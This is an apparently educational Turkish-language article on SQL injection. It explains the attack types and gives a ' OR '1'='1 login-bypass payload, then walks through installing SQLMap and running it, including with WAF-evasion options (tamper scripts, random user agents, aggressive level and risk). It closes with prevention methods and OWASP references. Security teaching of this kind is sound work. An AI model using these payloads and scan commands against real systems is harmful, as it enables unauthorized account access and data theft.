# SQL Injection (Sql Enjeksiyonu)

## SQL Enjeksiyonu Nedir?

SQL Enjeksiyonu, kullanıcıdan alınan girdileri filtrelemeden SQL veritabanında sorgu yapılması sonucu oluşan güvenlik açığıdır. Saldırganlar bu açığı kullanarak SQL komutlarını giriş alanlarına yerleştirerek veritabanına yetkisiz erişim sağlayabilir.

---

## ⚠️ Yasal Çerçeve

Bu bilgileri **yalnızca** aşağıdaki durumlarda kullanın:

- ✅ Kendi test sistemlerinizde
- ✅ İzniniz olan web sitelerinde

**Uyarı:** İzin olmayan sistemlerde SQL injection saldırısı yapmak **yasadışıdır** ve hukuki sonuçlar doğurabilir.

> Bu makale, farkındalık ve eğitim amaçlıdır. Yazar (Serpten) yanlış kullanımdan sorumlu değildir.

---

## SQL Enjeksiyonun Verebileceği Zararlar

- 🔴 Saldırganın yetkisiz bir şekilde kullanıcı bilgilerini değiştirmesi
- 🔴 Veri hırsızlığı
- 🔴 SQL login bypass ile kullanıcı hesaplarına sızılması
- 🔴 Sistem üzerinde yetkisiz işlemler yapılması
- 🔴 Veritabanının tamamen silinmesi

---

## SQL Enjeksiyonun Türleri

### 1. **Klasik SQL Injection**
Saldırgan, zararlı SQL kodunu doğrudan giriş alanına ekler ve sonuçları aynı kanal üzerinden alır.

### 2. **Kör SQL Injection (Blind SQL Injection)**
Veritabanı doğrudan hata mesajı döndürmez. Saldırgan, uygulamanın davranışındaki değişikliklere bakarak bilgi çıkarır.

### 3. **Band Dışı SQL Injection (Out-of-Band SQL Injection)**
Sonuçlar farklı bir kanal üzerinden alınır (örneğin DNS veya HTTP istekleri).

---

## SQL Login Bypass

Eğer bir sistemde SQL Enjeksiyonu açığı varsa, kullanıcının şifresini bilmeden hesabına sızabilirsiniz.

### Temel Payload:
```sql
' OR '1'='1
```

### Örnek:

Şifre alanına şu komutu yazarsak:
```
12345' OR '1'='1
```

SQL veritabanında sorgu şu şekilde olur:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='12345' OR '1'='1';
```

**Sonuç:** `1` değeri `1`e eşit olduğu için bu koşul her zaman doğru olur ve şifre yanlış olsa bile hesaba sızabilirsiniz.

---

## SQLMap - Otomatik SQL Injection Aracı

SQLMap, SQL Injection açıklarını sömürmek için kullanılan güçlü bir otomasyon aracıdır.

### Kurulum

```bash
# GitHub repository'sini klonla
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Klonlanan dizine git
cd sqlmap-dev

# Test et
python sqlmap.py -h
```

### Ana Parametreler

| Parametre | Kısaltma | Açıklama |
|-----------|----------|---------|
| `--url` | `-u` | Hedef sitenin URL'sini belirtir |
| `--cookie` | `-c` | Hedef sitenin çerezini (cookie) belirtir |
| `--technique` | - | Kullanılacak enjeksiyon tekniğini belirler (BEUSTQ) |
| `--tamper` | - | WAF bypass komutlarından birini seçer |
| `--random-agent` | - | Her istekte rastgele User-Agent kullanır (WAF'ı aldatır) |
| `--level` | - | Test seviyesi (1-5, default: 1) |
| `--risk` | - | Risk seviyesi (1-3, default: 1) |

### Kullanım Örnekleri

#### 1️⃣ Temel Kullanım
```bash
python sqlmap.py -u "http://example.com/page?id=1" -c "session_cookie"
```

#### 2️⃣ WAF Bypass ile
```bash
python sqlmap.py -u "http://example.com/page?id=1" \
  -c "session_cookie" \
  --technique=BEUSTQ \
  --tamper=space2comment \
  --random-agent
```

#### 3️⃣ Agresif Tarama
```bash
python sqlmap.py -u "http://example.com/page?id=1" \
  -c "session_cookie" \
  --technique=BEUSTQ \
  --tamper=space2comment \
  --random-agent \
  --level=5 \
  --risk=3
```

---

## 🛡️ Korunma Yöntemleri

1. **Parametreli Sorgular (Prepared Statements)** - En etkili yöntem
2. **Giriş Doğrulama (Input Validation)** - Kullanıcı girdisini kontrol etme
3. **ORM Kullanımı** - Veritabanı abstraction layer'ı
4. **Escape Karakterleri** - Özel karakterleri güvenli hale getirme
5. **Least Privilege Prensibi** - Veritabanı kullanıcısına minimum yetki verme
6. **WAF (Web Application Firewall)** - Kötü amaçlı istekleri filtreleme

---

## 📚 Kaynaklar

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [SQLMap Official Documentation](http://sqlmap.org/)

---

## 📝 Lisans

Bu proje eğitim ve farkındalık amaçlı olarak sunulmaktadır.

---

*Son güncelleme: 2026*
